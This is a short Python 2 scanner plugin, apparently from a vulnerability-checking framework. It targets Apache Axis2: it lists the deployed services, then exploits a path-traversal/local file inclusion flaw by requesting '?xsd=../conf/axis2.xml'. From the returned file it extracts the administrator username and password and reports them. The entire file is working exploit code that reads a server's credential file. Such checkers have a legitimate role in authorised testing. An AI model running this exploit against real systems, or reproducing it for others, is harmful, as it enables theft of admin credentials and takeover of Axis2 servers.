#coding:utf-8
#author:wolf@future-sec
import re
import urllib2
def check(host,port,timeout):
    try:
        url = "http://%s:%d"%(host,int(port))
        res = urllib2.urlopen(url+'/axis2/services/listServices',timeout=timeout)
        res_code = res.code
        res_html = res.read()
        if int(res_code) == 404:
            return 'NO'
        m=re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>',res_html)
        if m.group(1):
            server_str = m.group(1)
            read_url = url+'/axis2/services/%s?xsd=../conf/axis2.xml'%(server_str)
            res = urllib2.urlopen(read_url,timeout=timeout)
            res_html = res.read()
            if 'axisconfig' in res_html:
                try:
                    user=re.search('<parameter name="userName">(.*?)<\/parameter>',res_html)
                    password=re.search('<parameter name="password">(.*?)<\/parameter>',res_html)
                    info = '%s Local File Inclusion Vulnerability %s:%s'%(read_url,user.group(1),password.group(1))
                except:
                    pass
                return 'YES|'+info
    except Exception,e:
        return 'NO'
    return 'NO'
